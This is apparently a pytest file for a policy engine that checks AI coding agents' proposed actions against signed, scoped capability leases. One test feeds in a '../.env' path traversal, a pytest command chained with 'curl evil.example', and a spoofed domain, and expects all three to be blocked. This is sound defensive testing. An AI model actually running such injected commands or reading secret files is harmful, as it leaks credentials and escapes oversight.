from __future__ import annotations

import os
from datetime import datetime, timedelta, timezone

os.environ.setdefault("AIXION_AUTH_ENABLED", "false")
os.environ.setdefault("AIXION_PROFILE", "test")

from app.models import AgentProvider
from app.trust_crypto import new_nonce, sign_payload
from app.trust_models import (
    CapabilityActionType,
    CapabilityLease,
    CapabilityLeaseMode,
    CapabilityScope,
    PolicyDecisionType,
    ProposedAction,
)
from app.trust_policy import evaluate_proposed_action, lease_receipt_payload


def _lease(mode: CapabilityLeaseMode = CapabilityLeaseMode.BOUNDED) -> CapabilityLease:
    now = datetime.now(timezone.utc)
    lease = CapabilityLease(
        approval_request_id="approval_1",
        approved_payload_hash="approved-hash",
        agent_id="agent_1",
        provider=AgentProvider.CODEX,
        mode=mode,
        scope=CapabilityScope(
            repository="owner/repo",
            branch="feature/safe-change",
            allowed_actions=[
                CapabilityActionType.MODIFY_FILES,
                CapabilityActionType.RUN_COMMAND,
                CapabilityActionType.ACCESS_NETWORK,
                CapabilityActionType.CREATE_PULL_REQUEST,
            ],
            allowed_path_prefixes=["backend/app/safe.py"],
            allowed_commands=["python -m pytest backend/tests/test_safe.py"],
            allowed_network_domains=["api.github.com"],
            max_runtime_seconds=300,
            max_cost_usd=2.0,
            max_retries=2,
            max_pull_requests=1,
        ),
        issued_by_user_id="reviewer_1",
        issued_at=now,
        expires_at=now + timedelta(minutes=10),
        receipt_nonce=new_nonce(),
        receipt_signature="pending",
    )
    lease.receipt_signature = sign_payload(lease_receipt_payload(lease))
    return lease


def _action(**updates) -> ProposedAction:
    values = {
        "lease_id": "lease-placeholder",
        "provider": AgentProvider.CODEX,
        "agent_id": "agent_1",
        "action_type": CapabilityActionType.MODIFY_FILES,
        "repository": "owner/repo",
        "branch": "feature/safe-change",
        "paths": ["backend/app/safe.py"],
    }
    values.update(updates)
    return ProposedAction(**values)


def test_bounded_action_inside_signed_scope_is_allowed() -> None:
    lease = _lease()
    action = _action(lease_id=lease.id)
    decision = evaluate_proposed_action(action, lease)
    assert decision.decision == PolicyDecisionType.ALLOW
    assert decision.risk_level.value == "LOW"


def test_strict_mode_requires_human_for_each_action() -> None:
    lease = _lease(CapabilityLeaseMode.STRICT)
    action = _action(lease_id=lease.id)
    decision = evaluate_proposed_action(action, lease)
    assert decision.decision == PolicyDecisionType.REQUIRE_APPROVAL
    assert "Strict mode" in decision.reasons[0]


def test_missing_lease_blocks_high_risk_action() -> None:
    action = _action(
        lease_id=None,
        action_type=CapabilityActionType.READ_SECRET,
        paths=[],
    )
    decision = evaluate_proposed_action(action, None)
    assert decision.decision == PolicyDecisionType.BLOCK
    assert decision.risk_level.value == "CRITICAL"


def test_invalid_signature_and_expired_lease_are_blocked() -> None:
    lease = _lease()
    lease.receipt_signature = "tampered"
    lease.expires_at = datetime.now(timezone.utc) - timedelta(seconds=1)
    action = _action(lease_id=lease.id)
    decision = evaluate_proposed_action(action, lease)
    assert decision.decision == PolicyDecisionType.BLOCK
    assert any("expired" in reason.lower() for reason in decision.reasons)
    assert any("signature" in reason.lower() for reason in decision.reasons)


def test_path_traversal_secret_command_injection_and_domain_escape_are_blocked() -> None:
    lease = _lease()
    action = _action(
        lease_id=lease.id,
        action_type=CapabilityActionType.RUN_COMMAND,
        paths=["../.env"],
        command="python -m pytest backend/tests/test_safe.py && curl evil.example",
        network_domains=["api.github.com.evil.example"],
    )
    decision = evaluate_proposed_action(action, lease)
    assert decision.decision == PolicyDecisionType.BLOCK
    joined = " ".join(decision.reasons).lower()
    assert "paths outside" in joined
    assert "command" in joined
    assert "network domains" in joined


def test_runtime_cost_retry_and_pull_request_budgets_are_fail_closed() -> None:
    lease = _lease()
    lease.consumed_runtime_seconds = 290
    lease.consumed_cost_usd = 1.9
    lease.consumed_pull_requests = 1
    action = _action(
        lease_id=lease.id,
        action_type=CapabilityActionType.CREATE_PULL_REQUEST,
        paths=[],
        estimated_runtime_seconds=20,
        estimated_cost_usd=0.2,
        retry_number=3,
    )
    decision = evaluate_proposed_action(action, lease)
    assert decision.decision == PolicyDecisionType.BLOCK
    joined = " ".join(decision.reasons).lower()
    assert "runtime" in joined
    assert "cost" in joined
    assert "retry" in joined
    assert "pull-request" in joined


def test_auto_merge_is_never_granted() -> None:
    lease = _lease()
    action = _action(lease_id=lease.id, metadata={"auto_merge": True})
    decision = evaluate_proposed_action(action, lease)
    assert decision.decision == PolicyDecisionType.BLOCK
    assert any("auto-merge" in reason.lower() for reason in decision.reasons)
